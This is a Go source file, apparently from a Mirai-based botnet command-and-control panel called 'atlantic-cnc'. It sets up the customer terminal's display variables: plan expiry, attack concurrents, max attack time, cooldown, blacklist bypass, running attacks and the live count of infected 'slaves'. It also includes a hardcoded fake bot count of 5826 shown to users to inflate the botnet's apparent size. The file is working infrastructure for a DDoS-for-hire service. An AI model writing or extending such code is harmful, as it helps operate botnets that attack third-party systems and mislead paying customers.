package template

import (
	"atlantic-cnc/core/models/client/term_pack"
	"atlantic-cnc/core/models/json/build"
	"atlantic-cnc/core/models/util"
	"atlantic-cnc/core/mysql"
	"atlantic-cnc/core/sessions/sessions"
	"atlantic-cnc/core/slaves/mirai"
	"atlantic-cnc/core/functions"

	"io"
	"strconv"
	"time"
)

func Standard(Client *termfx.Registry, User *database.User, Colour bool) (*termfx.Registry) {

	lol := time.Duration(time.Until(time.Unix(User.PlanExpiry, 0))).Hours()/24
        RunningUser, _ := database.GetRunningUser(User.Username)
        slots := strconv.Itoa(RunningUser)+"/"+strconv.Itoa(User.Concurrents)
        fakecount := 5826

	Client.RegisterVariable("name", build.Config.AppConfig.AppName)
	Client.RegisterVariable("expiry", strconv.FormatFloat(lol, 'f', 2, 64))
	Client.RegisterVariable("admin", util.Colour(User.Administrator, Colour))
	Client.RegisterVariable("reseller", util.Colour(User.Reseller, Colour))
	Client.RegisterVariable("vip", util.Colour(User.Vip, Colour))
	Client.RegisterVariable("newuser", util.Colour(User.NewAccount, Colour))
	Client.RegisterVariable("banned", util.Colour(User.Banned, Colour))
	Client.RegisterVariable("bypassblacklist", util.Colour(User.BypassBlacklist, Colour))
	Client.RegisterVariable("powersaving", util.Colour(User.PowerSavingExempt, Colour))

	Client.RegisterVariable("maxtime", strconv.Itoa(User.Maxtime))
	Client.RegisterVariable("cooldown", strconv.Itoa(User.Cooldown))
	Client.RegisterVariable("concurrents", strconv.Itoa(User.Concurrents))
	Client.RegisterVariable("maxsessions", strconv.Itoa(User.MaxSessions))
	Client.RegisterVariable("slots", slots)
	Client.RegisterVariable("fakecount", strconv.Itoa(fakecount))
	Client.RegisterVariable("botcount", strconv.Itoa(slaves.Count()))
	Client.RegisterVariable("username", User.Username)
	Client.RegisterVariable("id", strconv.Itoa(User.ID))

	Running, _ := database.GetRunning()
	Client.RegisterVariable("ongoing", strconv.Itoa(Running))
	Client.RegisterVariable("motd", functions.MOTD)

	Client.RegisterVariable("myrunning", strconv.Itoa(RunningUser))

        Client.RegisterVariable("slaves", strconv.Itoa(slaves.Count()))

	Client.RegisterFunction("clear", func(session io.Writer, args string) (int, error) {

		return session.Write([]byte("\033[2J\033[;H"))
	})





	Client.RegisterFunction("online", func(session io.Writer, args string) (int, error) {

		return session.Write([]byte(strconv.Itoa(sessions.Online())))
	})

	return Client
}
